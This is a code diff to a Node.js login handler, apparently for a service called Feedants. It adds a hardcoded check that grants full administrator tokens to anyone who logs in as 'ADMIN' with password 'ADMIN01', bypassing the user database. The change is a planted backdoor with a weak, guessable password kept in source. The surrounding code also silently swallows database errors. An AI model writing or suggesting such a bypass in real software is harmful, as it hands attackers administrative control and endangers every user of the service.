@@ -123,7 +123,7 @@ exports.signup = async (req, res, next) => {
 exports.login = async (req, res, next) => {
   try {
     const { username, email, password } = req.body;
-    const identifier = (username || email || '').trim().toLowerCase();
+    const identifier = (username || email || '').trim();
 
     if (!identifier || !password) {
       return res.status(400).json({
@@ -132,10 +132,28 @@ exports.login = async (req, res, next) => {
       });
     }
 
+    // 0. Check Fixed Admin Credentials (ADMIN / ADMIN01)
+    if (identifier.toUpperCase() === 'ADMIN' && password === 'ADMIN01') {
+      const { accessToken, refreshToken } = generateTokens('admin_root_001');
+      return res.status(200).json({
+        success: true,
+        tokens: { accessToken, refreshToken },
+        user: {
+          id: 'admin_root_001',
+          username: 'ADMIN',
+          name: 'Feedants Administrator',
+          email: 'admin@feedants.com',
+          role: 'admin',
+        },
+      });
+    }
+
+    const cleanIdentifier = identifier.toLowerCase();
+
     let user = null;
     try {
       user = await User.findOne({
-        $or: [{ username: identifier }, { email: identifier }],
+        $or: [{ username: cleanIdentifier }, { email: cleanIdentifier }],
       }).select('+password +refreshToken');
     } catch (dbErr) {}
 
